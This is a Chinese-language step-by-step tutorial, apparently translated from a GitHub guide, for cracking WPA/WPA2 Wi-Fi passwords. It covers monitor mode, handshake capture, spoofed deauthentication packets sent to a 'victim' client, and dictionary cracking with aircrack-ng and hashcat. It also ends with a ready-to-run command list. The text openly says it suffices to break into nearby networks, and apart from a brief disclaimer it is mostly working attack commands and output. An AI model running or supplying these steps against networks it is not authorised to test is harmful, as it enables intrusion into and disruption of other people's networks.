# Wi-Fi破解

利用Airodump-ng以及[Aircrack-ng](http://aircrack-ng.org/)/[Hashcat](http://hashcat.net/)破解WPA/WPA2 WI-FI路由器。

这是一个简要的按照步骤的教程，描述了如何破解使用弱密码保护的WI-FI网络。它不会极其详尽，但是对于你测试你自己的网络安全或者入侵附近网络已经包含足够的信息。下面列出的攻击完全是被动的（仅仅监听，不会广播你电脑上的任何东西），并且对于你破解的但是却未真正使用的密码是无法监测到的。一个可选的破解认证的攻击可以用于加速侦查过程并且在[文档末尾](#deauth-attack)有描述。


如果你熟悉这个过程，你可以跳过这段描述直接跳到[底部](#命令列表)使用的命令列表。至于多种建议以及可行的方法，参考[附录](appendix.zh.md)。

__声明：这个软件/教程仅仅用于教学。不应该使用它从事任何非法活动。作者不会对它的使用负责。不要犯傻。__

## 入门

这个教程认为你：

- 可以流畅使用命令行
- 使用一个基于debian的linux发行版本，最好是[Kali linux](https://www.kali.org/)（OSX用户参考[附录](appendix.zh.md)）
- 安装[Aircrack-ng](http://aircrack-ng.org/)
  - `sudo apt-get install aircrack-ng`
- 无线网卡能够支持[监视模式](https://en.wikipedia.org/wiki/Monitor_mode)（对于支持的设备列表，参考[这](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html))

## 破解一个WI-FI网络

### 监视模式

开始通过下面的命令可以列出支持监视模式的无线接口：

```bash
airmon-ng
```

如果你看到没有列出一个接口，那么你的无线网卡就不支持监视模式 😞

我们将假设你的无线接口名称是`wlan0`，但是请确保使用正确的名称如果你的名称与这个不同的话。接下来，我们将接口转换为监视模式：

```bash
airmon-ng start wlan0
```

运行`iwconfig`。你现在应该能够看到列出一个新的监视模式接口（像`mon0`或者`wlan0mon`）。

### 找到你的目标

使用你的监视接口开始监听附近的[802.11 Beacon 帧](https://en.wikipedia.org/wiki/Beacon_frame)广播：

```bash
airodump-ng mon0
```

你应该可以看到类似于下面的输出。

```
CH 13 ][ Elapsed: 52 s ][ 2017-07-23 15:49                                         
                                                                                                                                              
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                              
 14:91:82:F7:52:EB  -66      205       26    0   1  54e  OPN              belkin.2e8.guests                                                   
 14:91:82:F7:52:E8  -64      212       56    0   1  54e  WPA2 CCMP   PSK  belkin.2e8                                                          
 14:22:DB:1A:DB:64  -81       44        7    0   1  54   WPA2 CCMP        <length:  0>                                                        
 14:22:DB:1A:DB:66  -83       48        0    0   1  54e. WPA2 CCMP   PSK  steveserro                                                          
 9C:5C:8E:C9:AB:C0  -81       19        0    0   3  54e  WPA2 CCMP   PSK  hackme                                                                 
 00:23:69:AD:AF:94  -82      350        4    0   1  54e  WPA2 CCMP   PSK  Kaitlin's Awesome                                                   
 06:26:BB:75:ED:69  -84      232        0    0   1  54e. WPA2 CCMP   PSK  HH2                                                                 
 78:71:9C:99:67:D0  -82      339        0    0   1  54e. WPA2 CCMP   PSK  ARRIS-67D2                                                          
 9C:34:26:9F:2E:E8  -85       40        0    0   1  54e. WPA2 CCMP   PSK  Comcast_2EEA-EXT                                                    
 BC:EE:7B:8F:48:28  -85      119       10    0   1  54e  WPA2 CCMP   PSK  root                                                                
 EC:1A:59:36:AD:CA  -86      210       28    0   1  54e  WPA2 CCMP   PSK  belkin.dca
```

出于这个演示的目的，我们将会破解我自己的网络，"hackme"。记住利用`airodump-ng`展示的BSSID MAC地址以及信道（`CH`）号，因为在下一个步骤中我们将会需要它们。

### 捕获4路握手

WPA/WPA2使用[4路握手](https://security.stackexchange.com/questions/17767/four-way-handshake-in-wpa-personal-wpa-psk)来认证设备连接网络。你不想要明白这些的含意，但是你必须捕获这些握手从而能够破解网络密码。这些握手发生在设备连接网络的时候，比如，当你的邻居工作回家的时候。我们通过之前命令发现的信道以及bssid值来使用`airmon-ng`来监视目标网络。

```bash
# 将-c 以及--bssid值替换为你的目标网络值
# -w 制订了我们保存捕获数据包保存的文件夹
airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
```
```
 CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]                                        
                                                                                                                                              
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                              
 9C:5C:8E:C9:AB:C0  -47   0      140        0    0   6  54e  WPA2 CCMP   PSK  ASUS  
```

现在我们等待... 一旦我们捕捉到一个握手，你应该能够马上在屏幕的右上角看到类似于`[ WPA handshake: bc:d3:c9:ef:d2:67`的一些东西。

如果你已经感觉不耐烦了，并且希望实施一次攻击，你可以强制设备连接到目标网站来重新连接，并且在目标网络中发送恶意的解除验证数据包。这经常就能够捕获4路握手。参考下面的[deauth攻击章节](#deauth-attack)来获取关于此的信息。

一旦你捕获了一个握手，按下`ctrl-c`来终止`airodump-ng`。你应该可以看到一个你告诉`airodump-ng`用来保存捕获信息的`.cap`文件（比如叫做`-01.cap`）。我们将会使用这个捕获文件来破解网络密码。我喜欢对这个文件重命名从而反映我们现在尝试破解的网络名称：

```bash
mv ./-01.cap hackme.cap
```

### 破解网络密码

最后一个步骤是使用捕获的握手来破解密码。如果你能够访问GPU，我**强烈**建议你使用`hashcat`来破解密码。我已经创建了一个叫做[`naive-hashcat`](https://github.com/brannondorsey/naive-hashcat)的简单工具可以让使用hashcat变得非常方便。如果你不能够访问GPU，还有很多在线的GPU破解服务可以使用，比如[GPUHASH.me](https://gpuhash.me/)或者[OnlineHashCrack](https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php)。你也可以常使用Aircrack-ng来进行CPU破解。

注意下面的攻击方法都假设用户使用弱的密码。大多数WPA/WPA2路由自带12位强随机密码，大多数用户都不会去更改。如果你去尝试破解这些密码，我建议你使用[Probable-Wordlists WPA-length](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length) 字典文件。

#### 使用`naive-hashcat`破解（推荐）

在我们使用naive-hashcat破解密码之前，我们需要将我们的`.cap`文件转换成同等hashcat文件格式`.hccapx`。你可以通过上传`.cap`文件到<https://hashcat.net/cap2hccapx/> 或者直接使用[`cap2hccapx`](https://github.com/hashcat/hashcat-utils)工具。

```bash
cap2hccapx.bin hackme.cap hackme.hccapx
```

接着，下载并且运行`naive-hashcat`：

```bash
# 下载
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# 下载134MBrockyou字典文件
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# 破解！宝贝！破解！
# 2500是hashcat对于WPA/WPA2的哈希模式
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

Naive-hashcat使用多种[字典](https://hashcat.net/wiki/doku.php?id=dictionary_attack)，[规则](https://hashcat.net/wiki/doku.php?id=rule_based_attack)，[组合](https://hashcat.net/wiki/doku.php?id=combinator_attack)以及[伪装](https://hashcat.net/wiki/doku.php?id=mask_attack)（聪明的暴力）攻击，并且它需要花费数天甚至数月来破解中等长度的密码。破解的密码将会保存到hackme.pot，因此阶段性地检查这个文件。一旦你破解这个密码，你将会在你的`POI_FILE`看到类似于下面的内容：

```
e30a5a57fc00211fc9f57a4491508cc3:9c5c8ec9abc0:acd1b8dfd971:ASUS:hacktheplanet
```

最后两块被`:`分隔开来，分别是网络名称和密码。

如果你希望不需要`naive-hashcat`来使用`hashcat`的话请参考[这个页面](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)。

#### 利用Aircrack-ng破解

Aircrack-ng可以用于在你的CPU上运行来进行非常基本的字典攻击。在你运行攻击之前，你需要一个单词表。我推荐使用非常著名的rockyou字典文件：

```bash
# 下载134MBrockyou字典文件
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

注意，如果网络密码不再这个单词文件话，你将不能破解密码。

```bash
# -a2指定WPA2，-b是BSSID，-w是单词文件
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap
```

如果密码被破解了，你将会在终端看到一个`KEY FOUND!`消息，在其后将会看到网络密码的纯文本。

```
                                 Aircrack-ng 1.2 beta3


                   [00:01:49] 111040 keys tested (1017.96 k/s)


                         KEY FOUND! [ hacktheplanet ]


      Master Key     : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89 
                       59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E 

      Transient Key  : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71 
                       2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73 
                       6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78 
                       8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21 

      EAPOL HMAC     : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4 
```

## 解除认证攻击

解除认证攻击会将伪造的身份验证数据包从您的计算机发送到连接到您尝试破解的网络的客户端。 这些数据包包括伪造的“发件人”地址，使得它们像客户端那样从接入点本身发送出去。 收到这样的数据包后，大多数客户端断开与网络的连接，并立即重新连接，如果您正在使用`airodump-ng`进行侦听，则提供4路握手。

使用`airodump-ng`监视特定接入点（使用`-c channel --bssid MAC`），直到看到客户端（`STATION`）连接。 连接的客户端看起来像这样，`64：BC：0C：48：97：F7`是客户端MAC。

```
 CH  6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ]                                         
                                                                                                                                           
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                           
 9C:5C:8E:C9:AB:C0  -19  75     1043      144   10   6  54e  WPA2 CCMP   PSK  ASUS                                                         
                                                                                                                                           
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                 
                                                                                                                                           
 9C:5C:8E:C9:AB:C0  64:BC:0C:48:97:F7  -37    1e- 1e     4     6479  ASUS
```

现在，让`airodump-ng`运行并打开一个新的终端。 我们将使用`aireplay-ng`命令向我们的受害者客户端发送假的接触认证数据包，强制其重新连接到网络，并希望在此过程中抓取握手。

```bash
# -0 2 指定了我们应该发送2个解除认证的数据包。如果需要考虑到被周围网络活动大段的风险，
# 可以增加这个数字
# -a 是接入点的MAC
# -c 是客户端的MAC
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
```

你可以选择得通过广播解除认证数据包到所有连接的客户端：

```bash
# 尽管不是所有的客户端都支持广播解除认证
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
```

一旦你发送了解除认证数据包，回到你的`airodump-ng`进程，运气好的话你现在应该看到右上角：`[WPA握手：9C：5C：8E：C9：AB：C0`。 现在你已经捕获了握手，你应该准备好[破解网络密码](#crack-the-network-password)。

## 命令列表

下面列出了破解WPA/WPA2网络所需的所有命令，以最少的解释为依据。

```bash
# 将你的设备设置成监视模式
airmon-ng start wlan0

# 监听附近所有的beacon帧来获取目标BSSID以及信道
airodump-ng mon0

# 开始监听握手
airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0

# 选择性的对于连接的设备进行解除验证从而强制握手
aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0

########## 利用aircrack-ng破解密码... ##########

# 如果需要的话下载134MB的rockyou.txt字典文件
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# 利用w/ aircrack-ng破解
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap

########## 或者利用naive-hashcat破解密码 ##########

# 将cap转换成hccapx
cap2hccapx.bin capture/-01.cap capture/-01.hccapx

# 利用naive-hashcat破解
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

## 附录

对本教程的回应是非常好的，我已经添加了社区成员的建议和附加资料作为[附录](#appendix.zh.md)。看看如何：

- 在MacOS/OSX上捕获握手并且破解WPA密码
- 利用`wlandump-ng`捕获从你周围每个网络捕获握手
- 使用`crunch`即时生成100多GB的单词列表
-  利用`macchanger`伪造你的MAC地址

## 致谢

这里提供的大部分信息都是从[Lewis Encarnacion的绝妙的教程](https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html)收集的。 感谢在Aircrack-ng和Hashcat上工作的优秀作者和维护者。

感谢[hiteshnayak305](https://github.com/hiteshnayak305)，[enilfodne](https://github.com/enilfodne)，[DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore)，[hivie7510](https://www.reddit.com/user/hivie7510)，[cprogrammer1994](https://github.com/cprogrammer1994)，[0XE4](https://github.com/0XE4)，[hartzell](https://github.com/hartzell)，[zeeshanu](https://github.com/zeeshanu)，[flennic](https://github.com/flennic)，[bhusang](https://github.com/bhusang)，[tversteeg](https://github.com/tversteeg)，[gpetrousov](https://github.com/gpetrousov)，[crowchirp](https://github.com/crowchirp)和[Shark0der](https://github.com/shark0der)，他们还在[Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/)和GitHub。如果您有兴趣听取WPA2的一些建议替代方案，请在[这](https://news.ycombinator.com/item?id=14840539)参考Hacker News的一些重要讨论。
